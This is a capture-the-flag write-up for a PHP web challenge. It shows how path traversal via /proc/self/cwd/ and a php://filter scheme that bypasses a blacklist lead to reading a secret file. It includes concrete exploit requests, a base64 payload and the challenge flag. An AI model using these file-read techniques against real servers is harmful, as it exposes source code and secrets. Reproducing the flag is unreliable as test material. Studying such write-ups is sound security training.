# JSON Beautifier

> **Category**: Web | **Difficulty**: Medium | **Competition**: ISCC 2026 School
> **Flag**: `ISCC{6fhFWkws25rBJmrCdZjp}`

---

## Attack Chain

```
信息收集 → /proc/self/cwd/ 读取源码 → 发现隐藏scheme处理逻辑 → php://filter绕过黑名单 → 读flag
```

## Key Techniques

### 1. /proc/self/cwd/ 路径穿越读源码

preview.php 白名单同时允许 `TMP_DIR` 和 `SRC_API_DIR`（源码目录），通过 `../../proc/self/cwd/` 可读取PHP源码。

### 2. php://filter SSRF

preview.php 隐藏逻辑：当 `.tmp` 文件内容含 `://` 且 scheme 不在黑名单时，调用 `file_get_contents()` 读取。

```
黑名单: http, https, ftp, ftps, phar, expect
未拦截: php → php://filter/resource=/secret/flag ✅
```

### 3. 完整利用

```bash
# Step 1: 通过data_uri写入payload
POST /api/beautify.php {"data":"data:text/plain;base64,cGhwOi8vZmlsdGVyL3Jlc291cmNlPS9zZWNyZXQvZmxhZw==","preview_type":"data_uri"}

# Step 2: 访问preview触发file_get_contents
GET /api/preview.php?file=preview_xxx.tmp
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| php://filter | `php://filter/resource=<path>` 读任意文件 |
| /proc/self/cwd/ | 指向进程工作目录, 常用于读源码 |
| 写入-读取脱节 | 写入时不检查scheme, 读取时才处理 = 漏洞 |
| 403/404 Oracle | 403=存在, 404=不存在, 文件存在性判断 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\校赛\JSON_Beautifier_wp.md`*
